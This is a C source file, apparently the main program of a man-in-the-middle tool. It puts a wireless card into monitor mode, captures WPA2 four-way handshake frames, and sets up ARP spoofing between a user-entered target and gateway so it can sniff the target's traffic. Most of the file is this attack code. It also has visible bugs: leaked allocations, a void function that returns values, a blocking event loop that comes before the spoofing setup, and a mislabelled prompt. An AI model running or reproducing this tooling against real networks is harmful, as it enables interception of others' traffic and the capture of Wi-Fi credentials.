#include<unistd.h>
#include<pthread.h>
#include "common.h"
#include"arp.h"
#include"sniffer.h"
#include"getif.h"
char ip_s[MAX_IPV4_LEN];
char mac_s[MAX_MAC_LEN];
int debug_level;
char *wfile;
bool manual=false;
void usage(){
	printf("MITM usage:\n"
		"  -h = show this help test\n"
		"  -d <level> = increase debugging verbosity\n"
		"  -i = interface name\n"
		"  -l = list all available interface\n"
		"  -m = manual set interface information\n"
		"  -f <filter> set packet filter\n");
}

static void handle_four_way_shakehand(void *ctx, const uint8_t *src_addr,
	       	const uint8_t *buf, size_t len) {
	uint32_t offset;
	struct WPA2_handshake_packet packet;
	packet.radiotap_hdr = *(struct ieee80211_radiotap_header*) buf;
	offset = packet.radiotap_hdr.it_len;
	
	if (offset > len) goto drop_packet;

	packet.type = parse_subtype(ntohs(*(uint32_t*) (buf + offset)));
	
	switch (packet.type) {
		case IEEE80211_DATA :
			packet.ieee80211_data = malloc(sizeof(struct ieee80211_hdr_3addr));
			packet.ieee80211_data = (struct ieee80211_hdr_3addr*)(buf + offset);
			offset += sizeof(struct ieee80211_hdr_3addr);
			break;
		case IEEE80211_QOS_DATA :
			packet.ieee80211_data = malloc(sizeof(struct ieee80211_qos_hdr));
			packet.ieee80211_data = (struct ieee80211_qos_hdr*)(buf + offset);
			offset += sizeof(struct ieee80211_qos_hdr);
			break;
		default:
			goto drop_packet;
	}

	if (offset > len) goto drop_packet;

	packet.llc_hdr = *(struct llc_header*)(buf + offset);
	packet.llc_hdr.type = ntohs(packet.llc_hdr.type);
	offset += sizeof(struct llc_header);

	if (offset > len) goto drop_packet;
	
	if (packet.llc_hdr.type == 0x888e) {
		packet.auth_data = *(struct ieee_8021x_authentication *) (buf + offset);
		offset += sizeof(struct ieee_8021x_authentication);

		if (offset > len) goto drop_packet;

		packet.auth_data.data = (buf + offset);
		packet.auth_data.len = ntohs(packet.auth_data.len);
		print_handshake_packet(packet);
	}
	//print_handshake_packet(packet);

	return 0;
drop_packet:
	return 1;
}

int main(int argc,char* argv[]){
	bool filter_set = false;
	int c ,exitcode;
	char user_filter[100];
	sni_info dev_info;
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_if_t* if_buf;
	pcap_if_t* monitor_buf;
	char* usr_dev;
	char* monitor_dev = "mon0";
	struct packet_handler *handler;
	struct l2_packet_data *l2_shakehand;
	for(;;){
		c=getopt(argc, argv,"i:hd:lmf:w:");
		if(c < 0)break;
		switch(c){
			case 'h':
				usage();
				goto out;
			break;
			case 'd':
				debug_level = atoi(optarg);
			break;
			case 'i':
				usr_dev = optarg;
			break;
			case 'l':
				if(getifinfo(&if_buf,errbuf)){
                                        exitcode = 10;
					goto out;
				}
				
				while(if_buf->next){
                                                printf("%s\n",if_buf->name);
                                                if_buf = if_buf->next;
				}
				return 0;
			break;
			case 'm':
				manual=true;	
			break;
			case 'f':
				strcpy(user_filter,optarg);
				filter_set = true;
			break;
			case 'w':
				wfile=optarg;
			break;
			default:
		       		usage();
				goto out;	
		}
	}
create_monitor_interface:
	printf( "If you are using wireless interface to capute traffic\n"
		"that must to create a monitor mode interface\n"
		"you can type (yes/no) to create interface or not\n"
		"also you can key the device name"
		", if you have already created a monitor mode interface:");

	char create_interface[10];
	scanf("%s", create_interface);
	if (!strcmp(create_interface, "yes")) {
		log_printf(MSG_DEBUG, "creating a monitor interface base on %s", usr_dev);
		char* interface_add_command[6] = {"dev", "interface", "add",
		       	monitor_dev,"type", "monitor"};
		if(!nl80211_init()) {
			if(!interface_handler(interface_add_command)) {
				if(if_up(monitor_dev) < 0) 
					return -1;
				log_printf(MSG_DEBUG, "hang up monitor interface %s successful", monitor_dev);
			}
		} 
	} else if (!strcmp(create_interface, "no")) {
		log_printf(MSG_DEBUG, "seem you are a rebellious guy em....");
		return -1;
	} else {
		if(!getifinfo(&monitor_buf, errbuf)) {
			if(!checkdevice(monitor_buf, create_interface)) {
				log_printf(MSG_INFO, "can't find the device %s,"
					       	"please check again!\n",create_interface);
				goto create_monitor_interface;
			} else {
				//strcpy(monitor_dev, create_interface);
				monitor_dev = create_interface;
			}
		}
	}

	eloop_init();

	// use ETH_P_PAE protcol ID to capute wpa2 four-way shakehand
	l2_shakehand = l2_packet_init(monitor_dev, ETH_P_ALL, handle_four_way_shakehand, NULL, 1); //ETH_P_PAE
	if (!l2_shakehand) {
		log_printf(MSG_ERROR, "l2_packet_data alloc failed");
		goto out;
	}
	eloop_run();

	if(getifinfo(&if_buf,errbuf)){
		exitcode = 10;
		goto out;
	}
	if(!checkdevice(if_buf,usr_dev)){
		exitcode = 11;
		goto out;
	}
	if(filter_set) {
		strcat(user_filter," && not arp");
	} else {
		strcpy(user_filter,"not arp");
	}

	printf("please type target's ip = ");
	scanf("%hhd.%hhd.%hhd.%hhd",&dev_info.target_ip[0],&dev_info.target_ip[1], 
			&dev_info.target_ip[2],&dev_info.target_ip[3]);

	/* sniffer init */
	dev_info.dev=usr_dev;
	if(exitcode = sniffer_init(&dev_info,errbuf)){
		goto out;
	}
	log_printf(MSG_DEBUG, "sniffer init successful");


//	eloop_init();
	if(manual){
		log_printf(MSG_INFO, "type gateway's mac");
		scanf("%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &dev_info.gateway_mac[0],
				&dev_info.gateway_mac[1], &dev_info.gateway_mac[2],
				&dev_info.gateway_mac[3], &dev_info.gateway_mac[4],
				&dev_info.gateway_mac[5]);
		log_printf(MSG_INFO, "type gateway's ip");
		scanf("%hhd.%hhd.%hhd.%hhd", &dev_info.gateway_ip[0], &dev_info.gateway_ip[1],
					&dev_info.gateway_ip[2], &dev_info.gateway_ip[3]);
		log_printf(MSG_INFO, "type target's mac");
		scanf("%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &dev_info.target_mac[0],
				&dev_info.target_mac[1], &dev_info.target_mac[2],
				&dev_info.target_mac[3], &dev_info.target_mac[4],
				&dev_info.target_mac[5]);
		log_printf(MSG_INFO, "type gateway's ip");
		scanf("%hhd.%hhd.%hhd.%hhd",&dev_info.target_ip[0],&dev_info.target_ip[1],
                                        &dev_info.target_ip[2],&dev_info.target_ip[3]);
	}

        MITM_info info={
                .TARGET_MAC=dev_info.target_mac,
                .ATTACKER_MAC=dev_info.attacker_mac,
                .GATEWAY_MAC=dev_info.gateway_mac,
                .TARGET_IP=dev_info.target_ip,
                .GATEWAY_IP=dev_info.gateway_ip,
	};
	
        strcpy(info.dev,usr_dev);
	info.filter = user_filter;
	/* init fake arp and the return value should be the next input to send_fake_arp op */
	//use eloop meshanism to replace create new thread
	eloop_register_timeout(1, 0, arp_spoof, NULL, &info);
	handler = pcap_fd_init(&info);
	if(!handler) {
		log_printf(MSG_ERROR, "init pcap handler failed");
		goto out;
	} else {
		eloop_register_read_sock(handler->fd, anlysis_packet, &info, handler);
	}
	//eloop_run();
	free(if_buf);	
	free(handler);
	l2_packet_deinit(l2_shakehand);
	return 0;

out :
	switch(exitcode){
		case -1:
			log_printf(MSG_ERROR, "unkonwn failure");
		break;
		case 10:
			log_printf(MSG_ERROR, "can't find device info,please run by superuser again");
		break;
		case 11:
			log_printf(MSG_ERROR, "can't find specify interface,please check by flag 'l'");
		break;
		case 12:
			log_printf(MSG_ERROR, "gateway is not exist or reject ping packet");
		break;
		case 13:
			log_printf(MSG_ERROR, "target is not exist or reject ping packet");
		break;
	}
	free(if_buf);
	free(handler);
	l2_packet_deinit(l2_shakehand);
	return -1;
}
